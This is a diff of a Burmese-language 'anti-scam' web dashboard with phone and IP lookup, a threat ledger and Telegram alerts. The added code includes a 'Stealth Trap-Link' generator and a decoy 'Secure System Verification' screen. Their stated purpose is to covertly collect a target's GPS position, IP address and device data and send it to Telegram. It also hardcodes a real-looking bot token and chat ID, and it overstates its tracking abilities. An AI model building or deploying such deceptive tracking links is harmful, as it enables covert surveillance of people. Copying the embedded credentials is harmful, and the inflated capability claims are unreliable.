@@ -3,443 +3,689 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lapu Intelligence - Cyberpunk Tactical Command</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800;900&family=Padauk:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        cyber: {
-                            dark: '#03060a',
-                            panel: 'rgba(10, 14, 23, 0.85)',
-                            red: '#ff003c',
-                            redglow: 'rgba(255, 0, 60, 0.4)',
-                            amber: '#ffaa00',
-                            cyan: '#00f0ff',
-                            border: '#1f293d'
-                        }
-                    },
-                    fontFamily: {
-                        padauk: ['Padauk', 'sans-serif'],
-                        orbitron: ['Orbitron', 'sans-serif'],
-                        mono: ['Share Tech Mono', 'monospace']
-                    }
-                }
-            }
-        }
-    </script>
+    <title>Lapu Intelligence - Cyberpunk Tactical Multi-Tracker</title>
     <style>
+        :root {
+            --bg-dark: #050811;
+            --panel-bg: rgba(13, 17, 23, 0.9);
+            --neon-red: #ff2a4b;
+            --neon-green: #00ff88;
+            --neon-blue: #00e5ff;
+            --neon-yellow: #ffb700;
+            --text-main: #e6edf3;
+            --text-dim: #8b949e;
+            --border-glow: 1px solid rgba(0, 229, 255, 0.3);
+        }
+
         body {
-            background-color: #03060a;
+            background-color: var(--bg-dark);
             background-image: 
-                radial-gradient(circle at 50% 0%, rgba(255, 0, 60, 0.18) 0%, transparent 75%),
-                linear-gradient(rgba(0,0,0,0.4) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,0,0,0.4) 1px, transparent 1px);
+                radial-gradient(circle at 50% 10%, rgba(255, 42, 75, 0.1), transparent 60%),
+                linear-gradient(rgba(0, 229, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 229, 255, 0.02) 1px, transparent 1px);
             background-size: 100% 100%, 30px 30px, 30px 30px;
-            color: #c9d1d9;
-            font-family: 'Padauk', sans-serif;
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 15px;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh;
         }
 
-        /* Tactical HUD Corner Elements */
-        .hud-border {
-            position: relative;
-            background: rgba(10, 14, 23, 0.85);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 0, 60, 0.3);
-            box-shadow: 0 0 25px rgba(255, 0, 60, 0.15), inset 0 0 15px rgba(255, 0, 60, 0.05);
+        .container {
+            width: 100%; max-width: 1000px;
+            box-sizing: border-box; display: flex; flex-direction: column; gap: 15px;
         }
 
-        .hud-border::before {
-            content: ''; position: absolute; top: -2px; left: -2px; width: 12px; height: 12px;
-            border-top: 2px solid #ff003c; border-left: 2px solid #ff003c;
-        }
-        .hud-border::after {
-            content: ''; position: absolute; bottom: -2px; right: -2px; width: 12px; height: 12px;
-            border-bottom: 2px solid #ff003c; border-right: 2px solid #ff003c;
+        .header-panel {
+            background: var(--panel-bg); border: 1px solid var(--neon-blue);
+            border-radius: 16px; padding: 20px; text-align: center;
+            box-shadow: 0 0 25px rgba(0, 229, 255, 0.15); position: relative; overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
-        .radar-sweep {
-            position: relative;
-            overflow: hidden;
-        }
-        .radar-sweep::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(180deg, rgba(255, 0, 60, 0.25) 0%, transparent 100%);
-            animation: radar 3s infinite linear;
+        .header-panel::after {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-green), transparent);
+            animation: radarScan 4s infinite linear;
         }
 
-        @keyframes radar {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
+        @keyframes radarScan { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+        .app-title { font-size: 26px; font-weight: 900; color: #fff; letter-spacing: 2px; margin: 0; text-shadow: 0 0 10px var(--neon-blue); }
+        .app-sub { font-size: 11px; color: var(--neon-green); letter-spacing: 3px; text-transform: uppercase; margin-top: 5px; }
+
+        .badge-bar { display: flex; justify-content: center; gap: 15px; margin-top: 15px; flex-wrap: wrap; }
+        .status-badge {
+            font-size: 11px; padding: 4px 12px; border-radius: 20px; font-weight: bold;
+            background: rgba(0, 255, 136, 0.05); border: 1px solid var(--neon-green); color: var(--neon-green);
+            display: flex; align-items: center; gap: 6px;
         }
 
-        /* Scanline effect */
-        .scanlines {
-            background: linear-gradient(
-                to bottom,
-                rgba(255,255,255,0),
-                rgba(255,255,255,0) 50%,
-                rgba(0, 0, 0, 0.3) 50%,
-                rgba(0, 0, 0, 0.3)
-            );
-            background-size: 100% 4px;
+        .grid-layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
+
+        .card {
+            background: var(--panel-bg); border: 1px solid rgba(48, 54, 61, 0.8);
+            border-radius: 14px; padding: 18px; backdrop-filter: blur(8px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5); position: relative;
         }
+        .card:hover { border-color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 229, 255, 0.15); }
+
+        .card-title {
+            font-size: 14px; font-weight: 700; color: var(--neon-blue); margin-bottom: 12px;
+            display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 8px;
+        }
+
+        .form-control { width: 100%; margin-bottom: 10px; box-sizing: border-box; }
+        .form-control label { font-size: 11px; color: var(--text-dim); display: block; margin-bottom: 4px; font-weight: 600; }
+        .form-control input, .form-control textarea, .form-control select {
+            width: 100%; padding: 10px; background: #090d16; color: #fff;
+            border: 1px solid #21262d; border-radius: 8px; font-size: 12px; box-sizing: border-box;
+        }
+        .form-control input:focus, .form-control textarea:focus, .form-control select:focus { border-color: var(--neon-blue); outline: none; box-shadow: 0 0 8px rgba(0, 229, 255, 0.3); }
+
+        .btn {
+            width: 100%; padding: 10px; border: none; border-radius: 8px; font-weight: 700; font-size: 12px;
+            cursor: pointer; transition: 0.2s; text-transform: uppercase; letter-spacing: 0.5px;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+        }
+        .btn-red { background: linear-gradient(135deg, #ff2a4b, #99001a); color: #fff; }
+        .btn-blue { background: linear-gradient(135deg, #00e5ff, #006699); color: #000; }
+        .btn-green { background: linear-gradient(135deg, #00ff88, #008044); color: #000; }
+        .btn-yellow { background: linear-gradient(135deg, #ffb700, #b38000); color: #000; }
+        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
+
+        .output-box {
+            margin-top: 10px; padding: 10px; background: #060911; border-radius: 6px;
+            border-left: 3px solid var(--neon-yellow); font-size: 11px; color: var(--text-main); line-height: 1.5; word-break: break-word;
+        }
+
+        .filter-bar {
+            display: flex; gap: 10px; flex-wrap: wrap; background: rgba(9, 13, 22, 0.7);
+            padding: 12px; border-radius: 8px; border: 1px solid #21262d; margin-bottom: 12px;
+        }
+
+        .crud-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
+        .crud-table th, .crud-table td { padding: 10px; text-align: left; border-bottom: 1px solid #21262d; }
+        .crud-table th { color: var(--neon-blue); font-weight: bold; background: rgba(0, 0, 0, 0.2); }
+
+        .act-btn { padding: 4px 8px; font-size: 10px; border-radius: 4px; border: none; cursor: pointer; font-weight: bold; }
+        .act-edit { background: var(--neon-yellow); color: #000; margin-right: 3px; }
+        .act-del { background: var(--neon-red); color: #fff; }
+
+        .tools-group { display: flex; gap: 8px; margin-top: 15px; flex-wrap: wrap; }
+        .tools-group .btn { width: auto; flex: 1; min-width: 120px; }
+
+        .pulse { width: 8px; height: 8px; background: var(--neon-green); border-radius: 50%; box-shadow: 0 0 8px var(--neon-green); }
+
+        #trapLoadingPanel {
+            display: none; background: #050811; color: #fff; text-align: center;
+            padding: 40px; border-radius: 16px; border: 1px solid var(--neon-red);
+            margin-top: 50px; font-weight: bold; box-shadow: 0 0 30px rgba(255, 42, 75, 0.3);
+        }
+
+        @media print {
+            body { background: #fff !important; color: #000 !important; }
+            .container { max-width: 100% !important; }
+            .card, .header-panel, body { background-image: none !important; box-shadow: none !important; color: #000 !important; border: 1px solid #000 !important; }
+            .grid-layout, .form-control, .btn, .filter-bar, .tools-group, input, hidden, #secureGateCard { display: none !important; }
+            .crud-table th { color: #000 !important; background: #eee !important; border-bottom: 2px solid #000 !important; }
+            .crud-table td { border-bottom: 1px solid #ccc !important; color: #000 !important; }
+            .act-btn { display: none !important; }
+            .print-only-header { display: block !important; text-align: center; margin-bottom: 20px; }
+        }
+        .print-only-header { display: none; }
     </style>
 </head>
-<body class="min-h-screen p-2 md:p-6 flex flex-col items-center scanlines">
+<body>
 
-    <div class="w-full max-w-6xl space-y-4">
-        
-        <!-- HEADER HUD -->
-        <header class="hud-border rounded-xl p-4 md:p-6 flex flex-col md:flex-row justify-between items-center gap-4 radar-sweep">
-            <div class="flex items-center space-x-4">
-                <div class="relative w-16 h-16 rounded-full border-2 border-cyber-red p-1 shadow-[0_0_15px_#ff003c]">
-                    <img src="https://i.ibb.co/LzNfS8Z/Nan-Htike-Taw-Logo.png" alt="Lapu Logo" class="w-full h-full object-cover rounded-full" onerror="this.src='https://placehold.co/100x100/03060a/ff003c?text=LAPU'">
-                    <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-cyber-red rounded-full animate-ping"></div>
+    <!-- 🪤 SCAMMER BAIT VIEW PANEL -->
+    <div id="trapLoadingPanel">
+        <h2 style="color: var(--neon-red); letter-spacing: 2px; text-shadow: 0 0 10px var(--neon-red);">SECURE SYSTEM VERIFICATION</h2>
+        <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #21262d; border-top-color: var(--neon-red); border-radius: 50%; animation: spin 1s infinite linear;"></div>
+        <p style="color: var(--text-dim); font-size: 13px;">Checking user connection security parameters. Please do not close this window...</p>
+    </div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+
+    <!-- ⚙️ MASTER CONTROLLER ENGINE -->
+    <div class="container" id="mainDashboard">
+        <!-- Print Header -->
+        <div class="print-only-header">
+            <h2>LAPU INTELLIGENCE UNITS - OFFICIAL THREAT REPORT</h2>
+            <p>Printed Date: <span id="printDate"></span></p>
+            <hr>
+        </div>
+
+        <!-- 🔒 SECURITY CREDENTIALS GATEWAY -->
+        <div class="card" id="secureGateCard" style="border-color: var(--neon-yellow); box-shadow: 0 0 15px rgba(255, 183, 0, 0.2);">
+            <div class="card-title" style="color: var(--neon-yellow);">🔒 SECURITY CREDENTIALS GATEWAY (အပြင်လူမမြင်စေရန် တောင်းဆိုမှုစနစ်)</div>
+            <p style="font-size: 11px; margin: 0 0 10px 0; color: var(--text-dim);">ဤနေရာတွင် သင့် Telegram Bot အချက်အလက်များကို ထည့်ပါ။ Source Code တွင် သိမ်းဆည်းမည်မဟုတ်ဘဲ ဤ Session ယာယီအသုံးပြုရန်သာ ဖြစ်သည်။</p>
+            <div class="grid-layout" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));">
+                <div class="form-control">
+                    <label>Telegram Bot Token:</label>
+                    <input type="password" id="inputBotToken" placeholder="9067011369:AAF4H4x-dAJEl4PnPP1lLMKF9vyVfOkOlf4" oninput="syncCredentials()">
                 </div>
-                <div>
-                    <h1 class="font-orbitron font-black text-2xl md:text-3xl text-white tracking-widest flex items-center gap-2">
-                        LAPU <span class="text-cyber-red">INTELLIGENCE</span>
-                    </h1>
-                    <p class="text-xs text-slate-400 font-bold uppercase tracking-wider">အွန်လိုင်းလောင်းကစားနှင့် ဆိုက်ဘာလိမ်လည်မှု နှိမ်နင်းရေး ကွပ်ကဲမှုစခန်း</p>
+                <div class="form-control">
+                    <label>Telegram Chat ID:</label>
+                    <input type="text" id="inputChatId" placeholder="5828316517" oninput="syncCredentials()">
                 </div>
             </div>
+            <div id="secureStatusBox" class="output-box" style="border-left-color: var(--neon-green); color: var(--neon-green); font-weight: bold;">⚠️ Status: Credentials Not Configured (Telegram Alert Offline)</div>
+        </div>
 
-            <div class="flex flex-wrap items-center justify-center gap-4 text-center">
-                <div class="bg-black/60 border border-cyber-red/40 px-4 py-2 rounded-lg">
-                    <div class="text-[10px] text-cyber-red font-mono uppercase tracking-widest">Tactical Clock</div>
-                    <div id="liveClock" class="font-mono text-xl text-cyber-amber font-bold">00:00:00</div>
-                </div>
-                <div class="bg-black/60 border border-cyber-red/40 px-4 py-2 rounded-lg">
-                    <div class="text-[10px] text-cyber-cyan font-mono uppercase tracking-widest">Threat Status</div>
-                    <div class="text-xs font-bold text-cyber-red flex items-center justify-center gap-1 mt-1">
-                        <span class="w-2 h-2 rounded-full bg-cyber-red animate-pulse"></span> DEFCON 1 ACTIVE
-                    </div>
-                </div>
+        <!-- Header Panel -->
+        <div class="header-panel">
+            <h1 class="app-title">LAPU INTELLIGENCE TACTICAL ENGINE</h1>
+            <div class="app-sub">Advanced Phone, IP Tracking & Cyber Threat Audit Vault</div>
+            <div class="badge-bar">
+                <div class="status-badge"><div class="pulse"></div> Network Triangulation: Online</div>
+                <div class="status-badge" style="border-color:var(--neon-blue); color:var(--neon-blue);"><div class="pulse" style="background:var(--neon-blue);"></div> ISP Telemetry: Deep Scan</div>
+                <div class="status-badge" style="border-color:var(--neon-yellow); color:var(--neon-yellow);"><div class="pulse" style="background:var(--neon-yellow);"></div> CRUD Ledger: Active</div>
             </div>
-        </header>
+        </div>
 
-        <!-- MAIN TACTICAL SINGLE-SCREEN GRID -->
-        <main class="grid grid-cols-1 lg:grid-cols-3 gap-4">
+        <div class="grid-layout">
+            <!-- 🛰️ MODULE 1: Phone Intelligence -->
+            <div class="card">
+                <div class="card-title">📡 1. ဖုန်းနံပါတ် Carrier & Network Lookup</div>
+                <div class="form-control">
+                    <label>စစ်ဆေးလိုသည့် ဖုန်းနံပါတ်:</label>
+                    <input type="text" id="targetPhone" placeholder="ဥပမာ - 09971234567 သို့မဟုတ် 0945xxxxxxx">
+                </div>
+                <button class="btn btn-blue" onclick="traceTargetLocation()">အော်ပရေတာနှင့် ဒေသ ခွဲခြားမည်</button>
+                <div class="output-box" id="targetResult">ဖုန်းနံပါတ် စစ်ဆေးချက် အဖြေများ...</div>
+            </div>
+
+            <!-- 🌐 MODULE 2: IP & ISP Network Tracker -->
+            <div class="card">
+                <div class="card-title">🌐 2. IP Address & ISP တည်နေရာစစ်ဆေးစက်</div>
+                <div class="form-control">
+                    <label>စစ်ဆေးလိုသည့် IP Address (အင်တာနက်လိပ်စာ):</label>
+                    <input type="text" id="targetIP" placeholder="ဥပမာ - 103.25.10.x သို့မဟုတ် 203.x.x.x">
+                </div>
+                <button class="btn btn-green" onclick="traceIPNetwork()">အင်တာနက်အမျိုးအစားနှင့် တည်နေရာရှာမည်</button>
+                <div class="output-box" id="ipResult">IP အင်တာနက် အမျိုးအစားနှင့် တည်နေရာ အဖြေ...</div>
+            </div>
+
+            <!-- 🎯 MODULE 3: Stealth Baiting Link Generator -->
+            <div class="card">
+                <div class="card-title">🎯 3. Stealth Trap-Link (ငါးစာလင့်ခ် စနစ်)</div>
+                <div class="form-control">
+                    <label>Scammer ထံ ပို့မည့် လင့်ခ်အမည် (Custom Name):</label>
+                    <input type="text" id="baitName" value="Secure-System-Verification">
+                </div>
+                <button class="btn btn-yellow" onclick="generateTrapLink()">GPS Trap-Link ဖန်တီးမည်</button>
+                <div class="output-box" id="baitResult">လင့်ခ်ကို Scammer ထံ ပေးပို့လိုက်ပါက ၎င်းတို့၏ တိကျသော GPS, IP နှင့် Device ဒေတာများကို Telegram သို့ ပို့ပေးမည်။</div>
+            </div>
+        </div>
+
+        <!-- 📊 MODULE 4: Advanced CRUD Ledger & Threat Vault -->
+        <div class="card" style="grid-column: 1 / -1;">
+            <div class="card-title">📊 လိမ်လည်သူများ၏ တည်နေရာနှင့် မသင်္ကာဖွယ် မှတ်တမ်း Database (Advanced Vault)</div>
             
-            <!-- LEFT PANEL: THREAT ANALYSIS TOOLS -->
-            <section class="space-y-4">
-                
-                <!-- TOOL 1: PHISHING & GAMBLING LINK CHECKER -->
-                <div class="hud-border rounded-xl p-4 space-y-3">
-                    <div class="flex items-center justify-between border-b border-cyber-red/30 pb-2">
-                        <h2 class="font-orbitron text-sm font-bold text-white flex items-center gap-2">
-                            <span class="text-cyber-red">🌐</span> DOMAIN / LINK THREAT CHECKER
-                        </h2>
-                        <span class="text-[10px] font-mono text-cyber-cyan">URL AUDIT</span>
-                    </div>
-                    <p class="text-xs text-slate-400">တရားမဝင် လောင်းကစားဆိုက် သို့မဟုတ် Phishing Link ကို စစ်ဆေးပါ</p>
-                    <div class="space-y-2">
-                        <input type="text" id="urlInput" placeholder="https://scam-gambling.com" class="w-full bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red transition">
-                        <button onclick="checkURL()" class="w-full bg-cyber-red/20 border border-cyber-red hover:bg-cyber-red text-white font-bold py-2 rounded-lg text-xs tracking-wider transition duration-200">
-                            LINK ကို အန္တရာယ် စစ်ဆေးမည်
-                        </button>
-                    </div>
-                    <div id="urlResult" class="text-xs font-mono"></div>
+            <input type="hidden" id="editIndex" value="-1">
+            <div class="grid-layout" style="grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); margin-bottom: 12px;">
+                <div class="form-control">
+                    <label>နာမည် / အကောင့်ကုဒ်:</label>
+                    <input type="text" id="scamName" placeholder="လိမ်လည်သူ အမည်">
                 </div>
-
-                <!-- TOOL 2: TELECOM GPS TRACKER -->
-                <div class="hud-border rounded-xl p-4 space-y-3">
-                    <div class="flex items-center justify-between border-b border-cyber-red/30 pb-2">
-                        <h2 class="font-orbitron text-sm font-bold text-white flex items-center gap-2">
-                            <span class="text-cyber-red">📱</span> PHONE & CARRIER TRACER
-                        </h2>
-                        <span class="text-[10px] font-mono text-cyber-cyan">CELLULAR</span>
-                    </div>
-                    <p class="text-xs text-slate-400">သံသယရှိ ဖုန်းနံပါတ်၏ Network နှင့် တည်နေရာ တိုက်ဆိုင်စစ်ဆေးရန်</p>
-                    <div class="space-y-2">
-                        <input type="text" id="phoneInput" placeholder="09xxxxxxxxx" class="w-full bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red transition">
-                        <button onclick="trackPhone()" class="w-full bg-cyber-red/20 border border-cyber-red hover:bg-cyber-red text-white font-bold py-2 rounded-lg text-xs tracking-wider transition duration-200">
-                            ဖုန်းနံပါတ် ခြေရာခံမည်
-                        </button>
-                    </div>
-                    <div id="phoneResult" class="text-xs font-mono"></div>
+                <div class="form-control">
+                    <label>ဖုန်းနံပါတ် / Wallet / IP:</label>
+                    <input type="text" id="scamContact" placeholder="ဆက်သွယ်ရန် သို့မဟုတ် IP">
                 </div>
-
-                <!-- TOOL 3: WALLET & FINANCIAL AUDIT -->
-                <div class="hud-border rounded-xl p-4 space-y-3">
-                    <div class="flex items-center justify-between border-b border-cyber-red/30 pb-2">
-                        <h2 class="font-orbitron text-sm font-bold text-white flex items-center gap-2">
-                            <span class="text-cyber-red">💳</span> WALLET & FINANCIAL AUDIT
-                        </h2>
-                        <span class="text-[10px] font-mono text-cyber-cyan">FINTECH</span>
-                    </div>
-                    <p class="text-xs text-slate-400">KPay / Wave Money / Bank အကောင့်နံပါတ်များ စစ်ဆေးရန်</p>
-                    <div class="space-y-2">
-                        <input type="text" id="walletInput" placeholder="KPay / Wave Account No." class="w-full bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red transition">
-                        <button onclick="checkWallet()" class="w-full bg-cyber-red/20 border border-cyber-red hover:bg-cyber-red text-white font-bold py-2 rounded-lg text-xs tracking-wider transition duration-200">
-                            ငွေလွှဲအကောင့် စစ်ဆေးမည်
-                        </button>
-                    </div>
-                    <div id="walletResult" class="text-xs font-mono"></div>
+                <div class="form-control" style="grid-column: 1 / -1;">
+                    <label>ခြေရာခံရရှိသော တည်နေရာ / ISP / အသေးစိတ်:</label>
+                    <textarea id="scamLoc" rows="2" placeholder="ဥပမာ - Yangon, MPT Fiber / GPS: 16.8409, 96.1735"></textarea>
                 </div>
+            </div>
+            
+            <button class="btn btn-red" id="saveBtn" onclick="saveThreatRecord()">မှတ်တမ်းအသစ် သိမ်းဆည်းမည် / Telegram Alert ပို့မည်</button>
 
-            </section>
+            <hr style="border: 0; border-top: 1px solid #21262d; margin: 20px 0;">
 
-            <!-- CENTER & RIGHT PANEL: CRUD BLACKLIST VAULT -->
-            <section class="lg:col-span-2 space-y-4">
-                
-                <!-- BLACKLIST CRUD VAULT -->
-                <div class="hud-border rounded-xl p-4 space-y-4 h-full flex flex-col justify-between">
-                    <div>
-                        <!-- PANEL TITLE -->
-                        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-cyber-red/30 pb-3 gap-2">
-                            <div>
-                                <h2 class="font-orbitron text-base font-bold text-white flex items-center gap-2">
-                                    <span class="text-cyber-red">🛡️</span> THREAT BLACKLIST DATABASE (FULL CRUD)
-                                </h2>
-                                <p class="text-xs text-slate-400">လိမ်လည်သူများနှင့် တရားမဝင်လောင်းကစား ဒေတာဘေ့စ် စီမံခန့်ခွဲမှု</p>
-                            </div>
-                            <button onclick="exportCSV()" class="bg-emerald-600/20 border border-emerald-500 hover:bg-emerald-600 text-emerald-300 font-bold px-3 py-1.5 rounded-lg text-xs transition flex items-center gap-1">
-                                📥 CSV ဖိုင်ထုတ်ယူမည်
-                            </button>
-                        </div>
-
-                        <!-- CREATE / EDIT FORM INPUTS -->
-                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 mt-4">
-                            <input type="hidden" id="editIndex" value="-1">
-                            <input type="text" id="targetName" placeholder="လိမ်လည်သူ အမည် / ဆိုက်" class="bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red">
-                            <input type="text" id="targetContact" placeholder="ဖုန်း / Wallet / URL" class="bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red">
-                            <input type="text" id="targetDesc" placeholder="လိမ်လည်မှု အမျိုးအစား အသေးစိတ်" class="bg-black/80 border border-cyber-border rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-red">
-                        </div>
-                        <button onclick="saveRecord()" id="saveBtn" class="mt-2 w-full bg-cyber-red text-black font-black py-2 rounded-lg text-xs tracking-widest hover:bg-red-500 transition shadow-[0_0_15px_#ff003c]">
-                            + သံသယရှိ အချက်အလက် သစ် သိမ်းဆည်းမည် (CREATE)
-                        </button>
-                        <div id="crudNotify" class="text-xs text-emerald-400 mt-1 font-mono"></div>
-
-                        <!-- SEARCH BAR -->
-                        <div class="mt-4">
-                            <input type="text" id="searchInput" onkeyup="renderVault()" placeholder="🔍 ဒေတာဘေ့စ်ထဲ ရှာဖွေရန်..." class="w-full bg-black/50 border border-cyber-border/80 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyber-cyan">
-                        </div>
-
-                        <!-- RECORDS LIST TABLE / CONTAINER -->
-                        <div class="mt-3 overflow-y-auto max-h-[320px] space-y-2 pr-1" id="vaultContainer">
-                            <!-- Items populated dynamically via JS -->
-                        </div>
-                    </div>
-
-                    <!-- FOOTER INTEL SUMMARY -->
-                    <div class="border-t border-cyber-red/20 pt-3 text-[11px] text-slate-500 flex justify-between items-center font-mono">
-                        <span>ENCRYPTION: AES-256 SYSTEM</span>
-                        <span>TELEGRAM SYNC: ACTIVE</span>
-                    </div>
+            <!-- Filtering Bar -->
+            <div class="filter-bar">
+                <div class="form-control" style="flex: 1; min-width: 150px; margin-bottom: 0;">
+                    <label>နှစ်အလိုက် စစ်ထုတ်ရန်:</label>
+                    <select id="filterYear" onchange="loadThreatVault()">
+                        <option value="ALL">နှစ်အားလုံး (All Years)</option>
+                    </select>
                 </div>
+                <div class="form-control" style="flex: 1; min-width: 150px; margin-bottom: 0;">
+                    <label>လအလိုက် စစ်ထုတ်ရန်:</label>
+                    <select id="filterMonth" onchange="loadThreatVault()">
+                        <option value="ALL">လအားလုံး (All Months)</option>
+                        <option value="01">ဇန်နဝါရီ (01)</option>
+                        <option value="02">ဖေဖော်ဝါရီ (02)</option>
+                        <option value="03">မတ် (03)</option>
+                        <option value="04">ဧပြီ (04)</option>
+                        <option value="05">မေ (05)</option>
+                        <option value="06">ဇွန် (06)</option>
+                        <option value="07">ဇူလိုင် (07)</option>
+                        <option value="08">သြဂုတ် (08)</option>
+                        <option value="09">စက်တင်ဘာ (09)</option>
+                        <option value="10">အောက်တိုဘာ (10)</option>
+                        <option value="11">နိုဝင်ဘာ (11)</option>
+                        <option value="12">ဒီဇင်ဘာ (12)</option>
+                    </select>
+                </div>
+            </div>
 
-            </section>
-        </main>
+            <!-- Table -->
+            <div style="overflow-x: auto;">
+                <table class="crud-table">
+                    <thead>
+                        <tr>
+                            <th>အမည်</th>
+                            <th>ဆက်သွယ်ရန်/အကောင့်/IP</th>
+                            <th>ခြေရာခံရရှိသည့် အချက်အလက်</th>
+                            <th>ရက်စွဲ/အချိန်</th>
+                            <th>လုပ်ဆောင်ချက်</th>
+                        </tr>
+                    </thead>
+                    <tbody id="threatVaultBody">
+                        <!-- Dynamically populated -->
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="tools-group">
+                <button class="btn btn-blue" onclick="exportThreatCSV()">📥 Export Excel (.CSV)</button>
+                <button class="btn btn-green" onclick="exportThreatJSON()">📤 Export Backup (.JSON)</button>
+                <button class="btn btn-yellow" onclick="triggerImportJSON()">📥 Import Backup (.JSON)</button>
+                <input type="file" id="importFile" style="display:none;" accept=".json" onchange="importThreatJSON(event)">
+                <button class="btn btn-red" onclick="printLedgerReport()">🖨️ စာရွက်ဖြင့် Print ထုတ်ရန် / PDF သိမ်းရန်</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        // 📡 TELEGRAM BOT CONFIGURATION (Fill your tokens)
-        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-        const chatId = 'YOUR_TELEGRAM_CHAT_ID';
+        let activeBotToken = '';
+        let activeChatId = '';
 
-        // REALTIME CLOCK
-        function updateClock() {
-            const now = new Date();
-            document.getElementById('liveClock').innerText = now.toTimeString().split(' ')[0];
+        function loadSavedCredentials() {
+            // Auto-load default configured tokens if available, or fetch from localStorage
+            const savedToken = localStorage.getItem('lapu_bot_token') || '9067011369:AAF4H4x-dAJEl4PnPP1lLMKF9vyVfOkOlf4';
+            const savedChat = localStorage.getItem('lapu_chat_id') || '5828316517';
+            
+            if (savedToken) {
+                document.getElementById('inputBotToken').value = savedToken;
+                activeBotToken = savedToken;
+            }
+            if (savedChat) {
+                document.getElementById('inputChatId').value = savedChat;
+                activeChatId = savedChat;
+            }
+            updateCredentialsStatus();
         }
-        setInterval(updateClock, 1000);
-        updateClock();
 
-        // 1. PHISHING & GAMBLING LINK CHECKER
-        function checkURL() {
-            const url = document.getElementById('urlInput').value.trim();
-            const res = document.getElementById('urlResult');
-            if(!url) { res.innerHTML = `<span class="text-cyber-amber">⚠️ ကျေးဇူးပြု၍ URL ထည့်သွင်းပါ</span>`; return; }
+        function syncCredentials() {
+            activeBotToken = document.getElementById('inputBotToken').value.trim();
+            activeChatId = document.getElementById('inputChatId').value.trim();
 
-            const isRisky = url.includes('bet') || url.includes('casino') || url.includes('2d') || url.includes('3d') || url.includes('slot') || url.includes('game');
-            if(isRisky) {
-                res.innerHTML = `<div class="p-2 bg-red-950/80 border border-red-500 rounded text-red-300">🚨 <b>သတိပေးချက်:</b> တရားမဝင် လောင်းကစား သို့မဟုတ် လိမ်လည်မှု Phishing Domain ဖြစ်ရန် 98% သေချာပါသည်။</div>`;
+            localStorage.setItem('lapu_bot_token', activeBotToken);
+            localStorage.setItem('lapu_chat_id', activeChatId);
+            updateCredentialsStatus();
+        }
+
+        function updateCredentialsStatus() {
+            const statusBox = document.getElementById('secureStatusBox');
+            if (activeBotToken && activeChatId) {
+                statusBox.style.borderLeftColor = 'var(--neon-green)';
+                statusBox.style.color = 'var(--neon-green)';
+                statusBox.innerHTML = '🛡️ Status: Telegram Gateway Secure & Online (Active)';
             } else {
-                res.innerHTML = `<div class="p-2 bg-emerald-950/80 border border-emerald-500 rounded text-emerald-300">🛡️ <b>စစ်ဆေးချက်:</b> ပုံမှန် Domain ဖြစ်ပါသည် (စောင့်ကြည့်စာရင်းဝင်)။</div>`;
+                statusBox.style.borderLeftColor = 'var(--neon-yellow)';
+                statusBox.style.color = 'var(--neon-yellow)';
+                statusBox.innerHTML = '⚠️ Status: Credentials Missing (Telegram Alert Offline)';
             }
         }
 
-        // 2. PHONE TRACKER
-        function trackPhone() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            const res = document.getElementById('phoneResult');
-            if(!phone) { res.innerHTML = `<span class="text-cyber-amber">⚠️ ဖုန်းနံပါတ် ထည့်ပါ</span>`; return; }
-
-            let operator = "UNKNOWN NETWORK";
-            if(phone.startsWith("092") || phone.startsWith("094") || phone.startsWith("095")) operator = "MPT (Domestic Operator)";
-            else if(phone.startsWith("097")) operator = "Mytel Network";
-            else if(phone.startsWith("099") || phone.startsWith("096")) operator = "Atom / Ooredoo";
-
